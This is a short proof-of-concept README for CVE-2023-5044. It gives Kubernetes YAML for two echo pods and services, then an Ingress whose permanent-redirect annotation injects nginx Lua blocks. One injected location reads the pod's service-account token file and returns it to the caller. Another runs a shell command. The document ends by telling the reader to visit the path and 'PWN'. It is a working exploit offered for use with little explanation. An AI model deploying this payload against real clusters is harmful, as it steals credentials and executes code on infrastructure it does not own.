# CVE-2023-5044

## Code injection via nginx.ingress.kubernetes.io/permanent-redirect annotation

Firstly, you need deploy Pod & Service:

```yaml
kind: Pod
apiVersion: v1
metadata:
  name: apple-app
  labels:
    app: apple
spec:
  containers:
    - name: apple-app
      image: hashicorp/http-echo
      args:
        - "-text=apple"
---
kind: Service
apiVersion: v1
metadata:
  name: apple-service
spec:
  selector:
    app: apple
  ports:
    - port: 5678
---
kind: Pod
apiVersion: v1
metadata:
  name: banana-app
  labels:
    app: banana
spec:
  containers:
    - name: banana-app
      image: hashicorp/http-echo
      args:
        - "-text=banana"
---
kind: Service
apiVersion: v1
metadata:
  name: banana-service
spec:
  selector:
    app: banana
  ports:
    - port: 5678

```

Then, you need deploy exploit Ingress:

```yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: example-ingress
  annotations:
    ingress.kubernetes.io/rewrite-target: /
    nginx.ingress.kubernetes.io/permanent-redirect: https://google.com/;}location ~* "^/flibble(/|$)(.*)" {content_by_lua 'ngx.say(io.popen("cat /var/run/secrets/kubernetes.io/serviceaccount/token"):read("*a"))';}location ~* "^/flibblea(/|$)(.*)" { content_by_lua 'os.execute("touch /you")'
spec:
  rules:
  - http:
      paths:
        - path: /apple
          pathType: Prefix
          backend:
            service:
              name: apple-service
              port:
                number: 5678
        - path: /banana
          pathType: Prefix
          backend:
            service:
              name: banana-service
              port:
                number: 5678

```

Go to `[IP]/flibble` and PWN!

[Explain here](https://raesene.github.io/blog/2023/10/29/exploiting-CVE-2023-5044/)
